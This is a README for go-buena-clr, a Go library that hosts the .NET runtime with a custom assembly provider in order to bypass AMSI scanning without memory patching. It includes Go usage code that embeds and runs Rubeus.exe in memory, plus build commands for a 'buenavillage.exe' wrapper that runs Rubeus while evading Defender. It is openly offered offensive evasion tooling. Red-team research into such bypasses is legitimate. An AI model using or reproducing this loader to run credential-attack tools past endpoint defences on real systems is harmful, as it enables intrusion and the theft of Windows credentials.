# go-buena-clr

![go-buena-clr](go-buena-clr.png)

go-buena-clr CLR is the implementation in Go of [Being a Good CLR Host](https://github.com/passthehashbrowns/Being-A-Good-CLR-Host) by Joshua Magri from IBM X-Force Red.

It is built upon the [go-clr](https://github.com/Ne0nd0g/go-clr) project of Ne0nd0g, who in turn forked and maintained the original poc of [go-clr](https://github.com/ropnop/go-clr) by ropnop.

The purpose is to create our own `IHostControl` interface allowing us to implement the `ProvideAssembly` method. We can then use `Load_2` method instead of `Load_3`, circumventing AMSI entirely.


## Usage

Just import the package and use it !

```go
import (
	clr "github.com/almounah/go-buena-clr"
)

//go:embed Rubeus.exe
var testNet []byte

func main() {
    params := []string{"triage"}

    // Load the Good CLR and get the identity string from the .Net
	pRuntimeHost, identityString, _ := clr.LoadGoodClr("v4.0.30319", testNet)

    // Load the Assembly via its identityString
	assembly := clr.Load2Assembly(pRuntimeHost, identityString)

    // Invoke the Assembly
	pMethodInfo, _ := assembly.GetEntryPoint()
	clr.InvokeAssembly(pMethodInfo, params)
}
```

## Examples - Buena Village

Buena Village is a small POC project that showcase go-buena-clr in action. You can check `examples/BuenaVillage/` for a README and the complete code. 

Basically you do:

```bash
cd examples/BuenaVillage
go mod tidy
go run helper/helper.go -file=/home/kali/Desktop/Rubeus.exe && GOOS=windows GOARCH=amd64 go build
```

You will get a `buenavillage.exe` that you can use like `Rubeus.exe` whith native AMSI bypass without memory patching:

```powershell
.\buenavillage.exe triage
.\buenavillage.exe -help
```

## Motivation of Buena CLR

Basically we all noticed that a while ago, defender introduced behavioral rules to prevent AMSI memory patching.

Thanks to IBM X-Force Red, we got a patchless AMSI bypass that does not rely on the CPU like for Hardware Break Point !!

## Contributions

All contributions are welcome :)

## Side Story: Why the name go-buena-clr

In [Mushoku Tensei](https://myanimelist.net/anime/39535/Mushoku_Tensei__Isekai_Ittara_Honki_Dasu) buena village is the village where Rudeus Greyrat spent his childhood. As the name suggest, buena (good in spanish) village, was a good place for Rudeus to restart his life.

I named this project go-buena-clr as it is a good and warm CLR host for Rubeus.exe without AMSI, much like buena village was a good and warm place for Rudeus.

## License

To continue ropnop legacy this project is still licensed under the [Do What the Fuck You Want to Public License](http://www.wtfpl.net/). 
